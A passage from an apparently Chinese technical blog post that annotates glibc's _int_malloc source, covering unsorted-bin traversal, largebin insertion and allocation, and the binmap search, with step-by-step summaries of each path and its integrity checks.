class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!chunk_is_mmapped (p))</span><br><span class="line">    &#123;</span><br><span class="line">      assert (av == arena_for_chunk (p));   <span class="comment">//确保内存块所属的堆区域正确</span></span><br><span class="line">      <span class="keyword">if</span> (chunk_non_main_arena (p))</span><br><span class="line">        assert (av != &amp;main_arena);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        assert (av == &amp;main_arena);  <span class="comment">//进一步确定，一般只要标志位正确</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  do_check_inuse_chunk (av, p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Legal size ... */</span></span><br><span class="line">  assert ((sz &amp; MALLOC_ALIGN_MASK) == <span class="number">0</span>);  <span class="comment">//检查内存对齐</span></span><br><span class="line">  assert ((<span class="type">unsigned</span> <span class="type">long</span>) (sz) &gt;= MINSIZE);  <span class="comment">//检查size&gt;=minsize</span></span><br><span class="line">  <span class="comment">/* ... and alignment */</span></span><br><span class="line">  assert (aligned_OK (chunk2mem (p)));   <span class="comment">//检查起始地址满足对齐条件</span></span><br><span class="line">  <span class="comment">/* chunk is less than MINSIZE more than request */</span></span><br><span class="line">  assert ((<span class="type">long</span>) (sz) - (<span class="type">long</span>) (s) &gt;= <span class="number">0</span>);    <span class="comment">//检查要分配的size&gt;=要求的size</span></span><br><span class="line">  assert ((<span class="type">long</span>) (sz) - (<span class="type">long</span>) (s + MINSIZE) &lt; <span class="number">0</span>);   <span class="comment">//检查要分配的size&lt;要求的size+minsize</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而其中包含的<code>do_check_inuse_chunk (av, p);</code>概括来说是首先确保本chunk为非空闲状态，然后前后的chunk如果有空闲的则进行合法的检查</p><p>而<code>do_check_inuse_chunk (av, p);</code>其中包含的<code>do_check_chunk</code>，概括来说就是确保本chunk的地址在合法的范围</p><p>而<code>assert (prev_inuse (p));</code>这个语句 是由于如果free的时候前方为空闲则会合并，那么必须为非空闲</p><h3 id="largebin-FIFO"><a href="#largebin-FIFO" class="headerlink" title="largebin(FIFO)"></a>largebin(FIFO)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  idx = largebin_index (nb);</span><br><span class="line">  <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">    malloc_consolidate (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>判断是否有fastchunk,是则触发malloc_consolidate (av);</li><li>进入unsortedbin遍历循环,找到则返回</li><li>进入largebin分配</li></ol><h3 id="大循环"><a href="#大循环" class="headerlink" title="大循环"></a>大循环</h3><p>接下来就是大众所知的大循环了，接下来的几个部分都是大循环的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )       <span class="comment">//大循环</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h3 id="unsortedbin-FIFO-遍历"><a href="#unsortedbin-FIFO-遍历" class="headerlink" title="unsortedbin(FIFO)遍历"></a>unsortedbin(FIFO)遍历</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))   <span class="comment">//unsortedbin中有chunk</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;       <span class="comment">//bck是第一个unsorted chunk的bk</span></span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))   <span class="comment">//first check</span></span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);         </span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))    <span class="comment">//如果要申请的chunk处于smallbin的范围内，并且大小合适</span></span><br><span class="line">            &#123;                                                  <span class="comment">//victim为unsortedbin的唯一一个chunk，也是切割剩余的chunk</span></span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span>                    <span class="comment">//采用last_remainder分配方式</span></span><br><span class="line">              remainder_size = size - nb;             </span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);   <span class="comment">//初始取出</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)      <span class="comment">//大小相等直接取出</span></span><br><span class="line">            &#123; </span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))     <span class="comment">//如果在smallbin的范围</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span>       <span class="comment">//如果不在smallbin即largebin的范围</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)                                 <span class="comment">//largebin本身有chunk</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;          </span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))  <span class="comment">//小于最小的size</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size) </span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;   </span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);   <span class="comment">//标记相应binmap</span></span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;    <span class="comment">//插入</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)   <span class="comment">//最多循环1000次</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>过程</p><ul><li>对victim的size进行检查</li><li>当申请大小处于smallbin范围&amp;&amp;victim为unsortedbin中最后一个chunk&amp;&amp;victim为last_remainer&amp;&amp;size大于申请大小+min_size,采用last_remainer分配</li><li>将victim移除unsorted</li><li>如果size刚好则直接返回</li><li>否则进行进入bin的成链准备</li><li>标志binmap,并彻底成链,unsorted遍历也是唯一一会mark_bin处</li></ul><h3 id="编译后largebin的分配"><a href="#编译后largebin的分配" class="headerlink" title="编译后largebin的分配"></a>编译后largebin的分配</h3><p>​同一个largebin的size的大小是不一定相等的，而largebin的链表头-&gt;bk是最小的size，链表头-&gt;fd是最大的size，在除了链表头以外指向bk越来越大，指向fd越来越小；而bk_nextsize和fd_nextsize是指向下一个不同大小的chunk，同一个大小的chunk只有第一个chunk有nextsize，其他的nextsize位置为垃圾数据，bk_nextsize指向下一个更大的chunk，fd_nextsize指向上一个更小的chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">  bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">  <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;                           <span class="comment">//victim初始是本bin最大的chunk</span></span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))    <span class="comment">//largebin非空且要分配的size小于largebin最大的size</span></span><br><span class="line">    &#123;</span><br><span class="line">      victim = victim-&gt;bk_nextsize;                    </span><br><span class="line">      <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;    <span class="comment">//找到size恰好大于等于要分配size的chunk</span></span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">        victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">         list does not have to be rerouted.  */</span></span><br><span class="line">      <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">        victim = victim-&gt;fd;    <span class="comment">//尽量不取带有nextsize的chunk</span></span><br><span class="line"></span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      unlink (av, victim, bck, fwd);   <span class="comment">//取出victim，同时也有设置nextsize的功能</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Exhaust */</span></span><br><span class="line">      <span class="keyword">if</span> (remainder_size &lt; MINSIZE)  </span><br><span class="line">        &#123;</span><br><span class="line">          set_inuse_bit_at_offset (victim, size);</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">/* Split */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">             have to perform a complete insert here.  */</span></span><br><span class="line">          bck = unsorted_chunks (av);</span><br><span class="line">          fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))    <span class="comment">//检查unsorted bin</span></span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">              <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">          remainder-&gt;bk = bck;    <span class="comment">//将剩余的块放到unsorted bin里</span></span><br><span class="line">          remainder-&gt;fd = fwd;</span><br><span class="line">          bck-&gt;fd = remainder;</span><br><span class="line">          fwd-&gt;bk = remainder;</span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">            &#123;</span><br><span class="line">              remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">          set_foot (remainder, remainder_size);</span><br><span class="line">        &#125;</span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过程：</p><ul><li>首先先前条件是largebin不为空，要分配的size小于索引的最大size</li><li>之后找到size恰好大于要分配的size的chunk</li><li>如果该chunk不唯一，则取其fd指针指向的(尽量不取nextsize)</li><li>之后取出本chunk，得到remainder</li><li>如果remainder较小则保持原样，仍然在该chunk上即部分个</li><li>如果remainder&gt;&#x3D;MINSIZE，就取出然后放入unsortedbin里，在放入前会有一个check，即unsortedbin里的表头-&gt;fd-&gt;bk&#x3D;&#x3D;表头</li><li>之后分配返回该chunk</li></ul><h3 id="binmap情况"><a href="#binmap情况" class="headerlink" title="binmap情况"></a>binmap情况</h3><p>当在smallbin和largebin没有找到恰恰刚刚好的chunk的时候(bin里没有chunk)，就会进行到这一步</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   通过扫描存储桶来搜索内存块，从下一个较大的存储桶开始。这个搜索严格按照最佳适配的原则进行，也就是选择最小的（如果有多个大小相同的内存块，则选择近似最近使用的）适合的内存块。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   位图的使用避免了需要检查大多数块是否非空的情况。在还没有返回任何内存块的热身阶段跳过所有存储桶的特殊情况比看起来要快。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment"> bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment"> (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment"> that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment"> The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment"> when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">   ++idx;            <span class="comment">//此时必然没有合适的chunk，那么就++开始找</span></span><br><span class="line">   bin = bin_at (av, idx);</span><br><span class="line">   block = idx2block (idx);   <span class="comment">//block表示对应的idx属于哪一个block</span></span><br><span class="line">   <span class="built_in">map</span> = av-&gt;binmap[block];   <span class="comment">//map就表示block对应的bit组成的二进制数字</span></span><br><span class="line">   bit = idx2bit (idx);       <span class="comment">//idx的bit</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (;; )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">       <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)      <span class="comment">//该map没有相应的chunk</span></span><br><span class="line">         &#123;</span><br><span class="line">           <span class="keyword">do</span></span><br><span class="line">             &#123;</span><br><span class="line">               <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                 <span class="keyword">goto</span> use_top;</span><br><span class="line">             &#125;</span><br><span class="line">           <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);  <span class="comment">//如果能不满足说明该map对应的block肯定有满足条件的chunk</span></span><br><span class="line"></span><br><span class="line">           bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">           bit = <span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Advance to bin with set bit. There must be one. */</span> </span><br><span class="line">       <span class="comment">/* 前进到具有设置位的存储桶。必须存在一个存储桶。 */</span></span><br><span class="line">       <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)   <span class="comment">//找到对应的bin</span></span><br><span class="line">         &#123;</span><br><span class="line">           bin = next_bin (bin);</span><br><span class="line">           bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">           assert (bit != <span class="number">0</span>);    <span class="comment">//bit!=0</span></span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">       victim = last (bin);</span><br><span class="line"></span><br><span class="line">       <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">       <span class="comment">/* 如果是误报（空的存储桶），则清除该位。 */</span></span><br><span class="line">       <span class="keyword">if</span> (victim == bin)    </span><br><span class="line">         &#123;</span><br><span class="line">           av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">           bin = next_bin (bin);</span><br><span class="line">           bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">else</span><span class="comment">//接下来就是常规分割了</span></span><br><span class="line">         &#123;</span><br><span class="line">           size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">           <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">           assert ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">           remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* unlink */</span></span><br><span class="line">           unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Exhaust */</span></span><br><span class="line">           <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">             &#123;</span><br><span class="line">               set_inuse_bit_at_offset (victim, size);</span><br><span class="line">               <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                 victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Split */</span></span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">               remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">               <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                  have to perform a complete insert here.  